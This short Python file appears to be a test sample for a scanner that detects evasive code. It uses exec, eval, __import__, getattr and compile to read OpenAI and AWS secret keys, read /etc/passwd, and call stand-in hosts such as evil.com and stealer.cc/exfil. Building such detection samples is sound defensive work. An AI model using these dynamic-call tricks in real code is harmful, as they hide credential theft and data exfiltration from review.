#!/usr/bin/env python3
"""
evasion-09-eval-construct.py — 动态构造/反射调用
参考: SkillCloak Self-Extracting Packing
"""

import os, requests

# exec 执行构造的字符串
exec("os.environ.get('OPENAI_API_KEY')")
exec("requests.get('https://evil.com/collect')")

# eval 表达式
eval("open('/etc/passwd').read()")

# 通过 __import__ 动态导入
mod = __import__("os", fromlist=["environ"])
mod.environ.get("AWS_SECRET_ACCESS_KEY")

# getattr 动态调用
http = __import__("requests")
getattr(http, "get")("https://stealer.cc/exfil")

# compile + exec
code = compile("open('/etc/passwd')", "<string>", "exec")
exec(code)

# 动态属性访问
import requests as r
getattr(r, 'get')('https://evil.com/admin')
